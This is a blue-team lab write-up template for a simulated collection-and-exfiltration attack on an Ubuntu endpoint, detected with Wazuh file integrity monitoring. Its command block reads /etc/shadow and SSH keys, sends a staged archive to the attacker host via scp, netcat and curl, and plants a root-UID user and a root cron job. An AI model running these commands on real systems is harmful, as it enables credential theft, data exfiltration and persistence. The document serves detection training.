# 📂 Attack 05 – Suspicious File Activity (Ubuntu Endpoint)

## Attack Overview

| Field | Details |
|---|---|
| **Attack Name** | Suspicious File Creation, Modification & Exfiltration |
| **Target** | Ubuntu Desktop 26.04 (UBUNTU-ENDPOINT) |
| **Attacker** | Kali Linux (192.168.x.x) |
| **MITRE Tactic** | Collection / Exfiltration |
| **MITRE Technique** | T1005 – Data from Local System |
| **Severity** | High |
| **Date Performed** | YYYY-MM-DD |

## Objective

To simulate adversary behavior involving suspicious file activity — creating hidden files, accessing sensitive data, staging data for exfiltration, and modifying system files — testing Wazuh File Integrity Monitoring (FIM) and detection capabilities.

## Attack Methodology

1. Create hidden files and directories in user/system paths
2. Access and copy sensitive system files (passwd, shadow, SSH keys)
3. Stage collected data in a temporary directory
4. Simulate data exfiltration to attacker machine
5. Modify system configuration files
6. Document all FIM alerts and detection evidence

## Lab Environment

| Machine | Role | IP Address | OS |
|---|---|---|---|
| Kali Linux | Attacker | `192.168.x.x` | Kali 2025.2 |
| UBUNTU-ENDPOINT | Target/Victim | `192.168.x.x` | Ubuntu Desktop 26.04 |
| Wazuh Server | SIEM/Monitor | `192.168.x.x` | Ubuntu Server 26.04 |

## Kali Commands

```bash
# After gaining access to the target

# === SENSITIVE FILE ACCESS ===
cat /etc/passwd
cat /etc/shadow
cat /etc/ssh/sshd_config
find /home -name "*.key" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null

# === HIDDEN FILE CREATION ===
mkdir /tmp/.exfil_staging
touch /tmp/.hidden_script.sh
echo "#!/bin/bash" > /tmp/.hidden_script.sh
echo "tar czf /tmp/.exfil_staging/data.tar.gz /home/ /etc/passwd /etc/shadow" >> /tmp/.hidden_script.sh

# === DATA STAGING ===
tar czf /tmp/.exfil_staging/sensitive_data.tar.gz /etc/passwd /etc/shadow /home/<user>/.ssh/ 2>/dev/null
cp /var/log/auth.log /tmp/.exfil_staging/

# === SIMULATED EXFILTRATION ===
# Via SCP
scp /tmp/.exfil_staging/sensitive_data.tar.gz kali@<KALI_IP>:/tmp/

# Via Netcat
nc <KALI_IP> 9999 < /tmp/.exfil_staging/sensitive_data.tar.gz

# Via HTTP POST (curl)
curl -X POST -F "file=@/tmp/.exfil_staging/sensitive_data.tar.gz" http://<KALI_IP>:8080/upload

# === SYSTEM FILE MODIFICATION ===
echo "malicious_user:x:0:0::/root:/bin/bash" >> /etc/passwd
echo "* * * * * root /tmp/.hidden_script.sh" >> /etc/crontab
```

## Linux Logs Generated

**auth.log:**
```
Jun  6 12:10:01 ubuntu-endpoint sudo: <user> : command not allowed; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/shadow
```

**syslog:**
```
Jun  6 12:10:02 ubuntu-endpoint kernel: [12345.678] audit: type=1300 msg=audit(...) item=0 name="/etc/shadow" 
```

## Wazuh Alerts

| Alert ID | Rule ID | Description | Level | Timestamp |
|---|---|---|---|---|
| <!-- ID --> | 550 | File integrity checksum changed | 7 | <!-- Time --> |
| <!-- ID --> | 554 | File added to monitored directory | 7 | <!-- Time --> |
| <!-- ID --> | 553 | File deleted from monitored directory | 7 | <!-- Time --> |

```json
{
  "rule": {
    "id": "550",
    "description": "Integrity checksum changed",
    "level": 7
  },
  "syscheck": {
    "path": "/etc/passwd",
    "event": "modified",
    "md5_before": "...",
    "md5_after": "...",
    "changed_attributes": ["content", "mtime"]
  }
}
```

## Event IDs

| Wazuh Rule ID | Description | Level |
|---|---|---|
| 550 | File integrity checksum changed | 7 |
| 553 | File deleted from monitored directory | 7 |
| 554 | File added to monitored directory | 7 |

## Detection Process

1. Wazuh FIM detected modifications to critical system files (`/etc/passwd`, `/etc/shadow`)
2. New file creation alerts triggered for hidden files in `/tmp/`
3. Outbound network connections detected (SCP/NC to attacker IP)
4. Auth.log showed unauthorized attempts to read sensitive files

## Investigation Steps

1. **Alert Triage:** Reviewed FIM alerts for critical file modifications
2. **File Analysis:** Compared file checksums before and after modification
3. **Hidden File Discovery:** Searched for hidden files in temp directories
4. **Data Staging:** Identified staged archive files ready for exfiltration
5. **Network Analysis:** Checked for outbound connections to unknown IPs
6. **User Attribution:** Identified which user account performed the actions
7. **Verdict:** Confirmed data collection and attempted exfiltration

## MITRE ATT&CK Mapping

| Field | Value |
|---|---|
| **Tactic** | Collection / Exfiltration |
| **Technique ID** | T1005 / T1041 |
| **Technique Name** | Data from Local System / Exfiltration Over C2 Channel |
| **Procedure** | Adversary accessed sensitive system files, staged data in hidden directories, and attempted exfiltration via SCP/Netcat |
| **Detection Opportunity** | Configure Wazuh FIM to monitor `/etc/passwd`, `/etc/shadow`, `/home/*/.ssh/`; detect outbound connections to unusual IPs |

## Findings

| # | Finding | Severity | Evidence |
|---|---|---|---|
| 1 | <!-- Finding --> | <!-- High --> | <!-- FIM alert --> |
| 2 | <!-- Finding --> | <!-- Critical --> | <!-- Data staging --> |

## Lessons Learned

- <!-- FIM configuration for sensitive file monitoring -->
- <!-- Hidden file detection strategies -->
- <!-- Network egress monitoring importance -->
- <!-- File access auditing with auditd -->
- <!-- Data Loss Prevention (DLP) considerations -->

---

> 📌 **Status:** 📝 Template — Update with actual findings after performing the attack simulation.
